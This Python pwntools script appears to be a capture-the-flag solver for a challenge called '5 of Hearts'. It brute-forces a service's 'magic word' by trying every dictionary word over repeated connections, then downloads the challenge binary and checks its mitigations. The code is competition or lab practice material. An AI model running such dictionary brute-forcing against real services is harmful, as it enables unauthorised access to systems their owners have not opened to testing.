#!/usr/bin/env python3

import sys
import time
import tempfile

from pwn import *


def read_wordlist(wordlist="/usr/share/dict/words"):
    log.info("Reading wordlist {}".format(wordlist))

    with open(wordlist, "r") as file:
        return [line.rstrip() for line in file.readlines()]


def checksec(rhost, rport, magic):
    log.info("Retrieving challenge binary")
    conn = remote(rhost, rport)
    conn.recvuntil("Who is your daddy? ")
    log.info("Saying the magic word")
    conn.sendline(magic)

    with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as temp:
        file = conn.recvall()

        if not file.startswith(b"\x7fELF"):
            log.failure("File is not an ELF")
            sys.exit(1)

        write(temp.name, file)
        log.success("Binary saved to {}".format(temp.name))
        log.info("Checking mitigations on binary")
        ELF(temp.name)

    conn.close()


def run(rhost, rport, words):
    magic = None

    with log.progress("Checking {} words".format(len(words))) as check:
        start = time.time()

        for word in words:
            check.status(word)
            with context.silent:
                conn = remote(rhost, rport)
            conn.recvuntil("Who is your daddy? ")
            conn.sendline(word)

            try:
                # XXX: recvline_startswith causes EOFError on success
                if not conn.recvline().startswith(word.encode("ascii")):
                    log.success("{} is a magic word".format(word))
                    magic = word
                    break
            except UnicodeEncodeError:
                log.warning("Skipping non-ASCII word: {}".format(word))
            finally:
                with context.silent:
                    conn.close()

        log.info("{}s elapsed".format(time.time() - start))

    if not magic:
        log.failure("Ah ah ah, you didn't say the magic word!")
        sys.exit(1)

    checksec(rhost, rport, magic)


def main():
    rhost = args["RHOST"] or "127.0.0.1"
    rport = args["RPORT"] or 23
    wordlist = args["WORDLIST"] or "/usr/share/dict/words"

    log.info("Bruting magic word for 5 of Hearts")
    words = read_wordlist(wordlist)
    run(rhost, rport, words)


if __name__ == "__main__":
    main()
